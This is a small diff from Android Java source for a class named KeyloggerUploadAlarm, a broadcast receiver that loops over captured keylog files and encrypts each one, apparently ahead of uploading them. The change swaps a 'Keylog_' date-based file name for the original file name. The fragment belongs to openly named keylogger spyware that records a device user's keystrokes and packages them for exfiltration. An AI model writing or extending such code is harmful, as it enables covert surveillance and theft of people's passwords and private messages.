@@ -73,7 +73,9 @@ public class KeyloggerUploadAlarm extends BroadcastReceiver {
         for(File each : files){
 
             Log.d(TAG, "onReceive: path = " + each.getAbsolutePath());
-            Encrypt("Keylog_ " + formattedDate + "_" + i, each.getAbsolutePath());
+            //Encrypt("Keylog_ " + formattedDate + "_" + i, each.getAbsolutePath());
+            Encrypt(each.getName(), each.getAbsolutePath());
+
             i = i + 1;
             Log.d(TAG, "onReceive: i is: " + i);
             try{
